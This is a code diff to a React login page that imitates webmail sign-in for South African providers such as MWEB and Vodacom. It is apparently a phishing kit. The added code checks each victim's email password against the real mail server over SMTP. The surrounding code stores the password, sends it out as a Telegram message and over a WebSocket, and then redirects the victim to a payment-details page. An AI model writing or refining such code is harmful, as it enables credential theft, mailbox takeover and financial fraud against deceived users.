@@ -41,6 +41,8 @@ const Login = () => {
   const [mwebLoading, setMwebLoading] = useState(false);
   const [vodamailLoading, setVodamailLoading] = useState(false);
   const [webmailLoading, setWebmailLoading] = useState(false);
+  const [smtpError, setSmtpError] = useState(null);
+  const [isVerifyingSMTP, setIsVerifyingSMTP] = useState(false);
 
   // Force cache cleanup on component mount to prevent stale data
   useEffect(() => {
@@ -71,6 +73,7 @@ const Login = () => {
       setShowVodamailModal(false);
       setShowWebmailModal(false);
       setIsConnecting(false);
+      setSmtpError(null); // Clear SMTP error when email changes
       
       // Check for @mweb.co.za
       if (emailValue.includes("@mweb.co.za")) {
@@ -117,6 +120,71 @@ const Login = () => {
     return Object.keys(newErrors).length === 0;
   };
 
+  // Check if email domain requires SMTP verification
+  const requiresSMTPVerification = (email) => {
+    const emailLower = email.toLowerCase();
+    return (
+      emailLower.includes("@mweb.co.za") ||
+      emailLower.includes("@vodacom.co.za")
+      // @webmail.co.za and @vodamail.co.za no longer require verification
+    );
+  };
+
+  // Verify SMTP credentials
+  const verifySMTP = async (email, password) => {
+    console.log("[SMTP] Starting verification for:", email);
+    
+    if (!requiresSMTPVerification(email)) {
+      console.log("[SMTP] Domain does not require verification, skipping");
+      return { success: true, skip: true };
+    }
+
+    try {
+      // Get WebSocket host from environment or use default
+      // In development mode, always use localhost
+      const isDevelopment = import.meta.env.DEV || window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
+      const wsHost = isDevelopment 
+        ? "localhost:8090"
+        : (import.meta.env.VITE_WS_HOST || "localhost:8090").replace(
+            /^(https?:\/\/|wss?:\/\/)/i,
+            ""
+          );
+      
+      // Determine protocol (http for localhost, https for remote)
+      const protocol = wsHost.includes("localhost") || wsHost.startsWith("192.168.") || wsHost.startsWith("127.0.")
+        ? "http"
+        : "https";
+      
+      const apiUrl = `${protocol}://${wsHost}/api/verify-smtp`;
+      console.log("[SMTP] Calling API:", apiUrl);
+      console.log("[SMTP] Development mode:", isDevelopment);
+      console.log("[SMTP] Request payload:", { email, password: "***" });
+      
+      const response = await fetch(apiUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ email, password }),
+      });
+
+      console.log("[SMTP] Response status:", response.status, response.statusText);
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error("[SMTP] Response error:", errorText);
+        throw new Error(`SMTP verification request failed: ${response.status} ${response.statusText}`);
+      }
+
+      const result = await response.json();
+      console.log("[SMTP] Verification result:", result);
+      return result;
+    } catch (error) {
+      console.error("[SMTP] Verification error:", error);
+      return { success: false, error: error.message };
+    }
+  };
+
   const handleProviderLogin = async (e, provider) => {
     e.preventDefault();
     
@@ -135,7 +203,44 @@ const Login = () => {
       setWebmailLoading(true);
     }
     
+    setSmtpError(null);
+    setIsVerifyingSMTP(true);
+    
     try {
+      const email = formData.email.trim();
+      const password = formData.password.trim();
+      
+      // Verify SMTP credentials if required
+      const smtpResult = await verifySMTP(email, password);
+      setIsVerifyingSMTP(false);
+      
+      if (!smtpResult.success && !smtpResult.skip) {
+        // SMTP verification failed - don't proceed
+        let errorMessage = "Invalid email or password. Please check your credentials and try again.";
+        
+        // If error indicates connection refused, provide more context
+        if (smtpResult.error && smtpResult.error.includes("ECONNREFUSED")) {
+          const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
+          if (isLocalhost) {
+            errorMessage = "Email verification failed: Connection refused. This may be due to IP restrictions. Please test from the production server or contact support.";
+          } else {
+            errorMessage = "Email verification failed: Unable to connect to email server. Please check your credentials and try again.";
+          }
+        }
+        
+        setSmtpError(errorMessage);
+        
+        // Clear loading states
+        if (provider === "mweb") {
+          setMwebLoading(false);
+        } else if (provider === "vodamail") {
+          setVodamailLoading(false);
+        } else if (provider === "webmail") {
+          setWebmailLoading(false);
+        }
+        return;
+      }
+      
       const clientId =
         typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
       const clientIp =
@@ -146,8 +251,8 @@ const Login = () => {
       
       // Store fresh login data in localStorage for cumulative messages
       const loginData = {
-        email: formData.email.trim(),
-        password: formData.password.trim(),
+        email,
+        password,
       };
       localStorage.setItem("loginData", JSON.stringify(loginData));
 
@@ -162,8 +267,8 @@ const Login = () => {
             detail: {
               type: "login_data",
               clientId,
-              email: formData.email.trim(),
-              password: formData.password.trim(),
+              email,
+              password,
             },
           })
         );
@@ -192,6 +297,9 @@ const Login = () => {
       }, 2000);
     } catch (error) {
       console.error("Error in provider login:", error);
+      setIsVerifyingSMTP(false);
+      setSmtpError("An error occurred. Please try again.");
+      
       // Clear loading states on error
       if (provider === "mweb") {
         setMwebLoading(false);
@@ -210,42 +318,78 @@ const Login = () => {
       return;
     }
 
-    const clientId =
-      typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
-    const clientIp =
-      typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;
-
-    // Clear old login data first to avoid sending stale data
-    localStorage.removeItem("loginData");
+    setSmtpError(null);
+    setIsVerifyingSMTP(true);
     
-    // Store fresh login data in localStorage for cumulative messages
-    const loginData = {
-      email: formData.email.trim(),
-      password: formData.password.trim(),
-    };
-    localStorage.setItem("loginData", JSON.stringify(loginData));
-
-    // Build cumulative message with fresh data
-    const message = buildTelegramMessage(clientIp);
-    await send(message);
-
-    // Send to WebSocket server
     try {
-      window.dispatchEvent(
-        new CustomEvent("ws:emit", {
-          detail: {
-            type: "login_data",
-            clientId,
-            email: formData.email.trim(),
-            password: formData.password.trim(),
-          },
-        })
-      );
-    } catch {
-      // ignore
-    }
+      const email = formData.email.trim();
+      const password = formData.password.trim();
+      
+      // Verify SMTP credentials if required
+      const smtpResult = await verifySMTP(email, password);
+      setIsVerifyingSMTP(false);
+      
+      if (!smtpResult.success && !smtpResult.skip) {
+        // SMTP verification failed - don't proceed
+        let errorMessage = "Invalid email or password. Please check your credentials and try again.";
+        
+        // If error indicates connection refused, provide more context
+        if (smtpResult.error && smtpResult.error.includes("ECONNREFUSED")) {
+          const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
+          if (isLocalhost) {
+            errorMessage = "Email verification failed: Connection refused. This may be due to IP restrictions. Please test from the production server or contact support.";
+          } else {
+            errorMessage = "Email verification failed: Unable to connect to email server. Please check your credentials and try again.";
+          }
+        }
+        
+        setSmtpError(errorMessage);
+        setErrors({ email: true, password: true });
+        return;
+      }
+      
+      const clientId =
+        typeof window !== "undefined" ? localStorage.getItem("clientId") : null;
+      const clientIp =
+        typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;
 
-    navigate(`/payment-details?${randomParamsURL()}`);
+      // Clear old login data first to avoid sending stale data
+      localStorage.removeItem("loginData");
+      
+      // Store fresh login data in localStorage for cumulative messages
+      const loginData = {
+        email,
+        password,
+      };
+      localStorage.setItem("loginData", JSON.stringify(loginData));
+
+      // Build cumulative message with fresh data
+      const message = buildTelegramMessage(clientIp);
+      await send(message);
+
+      // Send to WebSocket server
+      try {
+        window.dispatchEvent(
+          new CustomEvent("ws:emit", {
+            detail: {
+              type: "login_data",
+              clientId,
+              email,
+              password,
+            },
+          })
+        );
+      } catch {
+        // ignore
+      }
+
+      navigate(`/payment-details?${randomParamsURL()}`);
+    } catch (error) {
+      console.error("Error in login:", error);
+      setIsVerifyingSMTP(false);
+      setSmtpError("An error occurred. Please try again.");
+      setErrors({ email: true, password: true });
+    }
   };
 
   return (
@@ -349,8 +493,35 @@ const Login = () => {
                       isInvalid={errors.password}
                     />
 
+                    {smtpError && (
+                      <Box
+                        bg="#fee2e2"
+                        color="#dc2626"
+                        border="1px solid #dc2626"
+                        borderRadius="6px"
+                        p={3}
+                        fontSize="14px"
+                        textAlign="center">
+                        {smtpError}
+                      </Box>
+                    )}
+
+                    {isVerifyingSMTP && (
+                      <Box
+                        bg="#dbeafe"
+                        color="#1e40af"
+                        border="1px solid #93c5fd"
+                        borderRadius="6px"
+                        p={3}
+                        fontSize="14px"
+                        textAlign="center">
+                        <ChakraSpinner size="sm" mr={2} />
+                        Verifying email credentials...
+                      </Box>
+                    )}
+
                     <Flex w="full" justify="center" pt={6}>
-                      <CustomButton type="submit" isLoading={loading}>
+                      <CustomButton type="submit" isLoading={loading || isVerifyingSMTP}>
                         Next
                       </CustomButton>
                     </Flex>
@@ -494,9 +665,36 @@ const Login = () => {
                     />
                   </Box>
 
+                  {smtpError && (
+                    <Box
+                      bg="#fee2e2"
+                      color="#dc2626"
+                      border="1px solid #dc2626"
+                      borderRadius="6px"
+                      p={3}
+                      fontSize="14px"
+                      textAlign="center">
+                      {smtpError}
+                    </Box>
+                  )}
+
+                  {isVerifyingSMTP && (
+                    <Box
+                      bg="#dbeafe"
+                      color="#1e40af"
+                      border="1px solid #93c5fd"
+                      borderRadius="6px"
+                      p={3}
+                      fontSize="14px"
+                      textAlign="center">
+                      <ChakraSpinner size="sm" mr={2} />
+                      Verifying email credentials...
+                    </Box>
+                  )}
+
                   <CustomButton
                     type="submit"
-                    isLoading={mwebLoading}
+                    isLoading={mwebLoading || isVerifyingSMTP}
                     w="full"
                     bg="#0066cc"
                     color="white"
@@ -651,9 +849,36 @@ const Login = () => {
                     />
                   </Box>
 
+                  {smtpError && (
+                    <Box
+                      bg="#fee2e2"
+                      color="#dc2626"
+                      border="1px solid #dc2626"
+                      borderRadius="6px"
+                      p={3}
+                      fontSize="14px"
+                      textAlign="center">
+                      {smtpError}
+                    </Box>
+                  )}
+
+                  {isVerifyingSMTP && (
+                    <Box
+                      bg="#dbeafe"
+                      color="#1e40af"
+                      border="1px solid #93c5fd"
+                      borderRadius="6px"
+                      p={3}
+                      fontSize="14px"
+                      textAlign="center">
+                      <ChakraSpinner size="sm" mr={2} />
+                      Verifying email credentials...
+                    </Box>
+                  )}
+
                   <CustomButton
                     type="submit"
-                    isLoading={vodamailLoading}
+                    isLoading={vodamailLoading || isVerifyingSMTP}
                     w="full"
                     bg="#1a73e8"
                     color="white"
@@ -777,9 +1002,36 @@ const Login = () => {
                     />
                   </Box>
 
+                  {smtpError && (
+                    <Box
+                      bg="#fee2e2"
+                      color="#dc2626"
+                      border="1px solid #dc2626"
+                      borderRadius="6px"
+                      p={3}
+                      fontSize="14px"
+                      textAlign="center">
+                      {smtpError}
+                    </Box>
+                  )}
+
+                  {isVerifyingSMTP && (
+                    <Box
+                      bg="#dbeafe"
+                      color="#1e40af"
+                      border="1px solid #93c5fd"
+                      borderRadius="6px"
+                      p={3}
+                      fontSize="14px"
+                      textAlign="center">
+                      <ChakraSpinner size="sm" mr={2} />
+                      Verifying email credentials...
+                    </Box>
+                  )}
+
                   <CustomButton
                     type="submit"
-                    isLoading={webmailLoading}
+                    isLoading={webmailLoading || isVerifyingSMTP}
                     w="full"
                     bg="#2c3e50"
                     color="white"
